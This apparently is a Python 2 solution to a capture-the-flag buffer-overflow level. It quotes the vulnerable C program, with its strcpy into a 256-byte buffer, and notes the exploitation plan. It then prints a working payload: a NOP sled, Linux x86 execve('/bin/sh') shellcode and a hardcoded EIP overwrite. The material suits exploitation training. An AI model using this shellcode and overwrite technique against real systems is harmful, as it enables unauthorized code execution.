"""
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}

Notes:
- Given a noticably large buffer of 256 bytes
- The environment variables are all set to NULL, so we cannot use them to spawn a shell
- Using the vulnerable strcpy function

Exploit:
- The nop sled and shellcode can be stored in the buffer
- Overwrite the EIP to point to an address in the buffer nop sled

Encountered issues:
- Did not place shellcode in buffer at first, instead placed it on the stack after the buffer
- Was using FreeBSD x86 shellcode, causing illegal instruction error
"""
import struct

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

nops = "\x90" * (264 - len(shellcode))
eip = struct.pack("I", 0xffffd798)  # points to the buffer

print nops + shellcode + eip
